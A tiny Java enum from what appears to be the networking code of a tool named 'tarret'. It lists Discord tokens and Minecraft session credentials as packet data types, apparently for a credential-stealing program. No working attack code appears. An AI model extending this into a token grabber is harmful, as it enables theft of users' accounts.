package de.hallotheengineer.tarret.networking.packet;

public enum DataType {
    DISCORD_TOKEN("DC Token"),
    MINECRAFT_SESSION("Session");
    public final String displayName;

    DataType(String s) {
        this.displayName = s;
    }
}
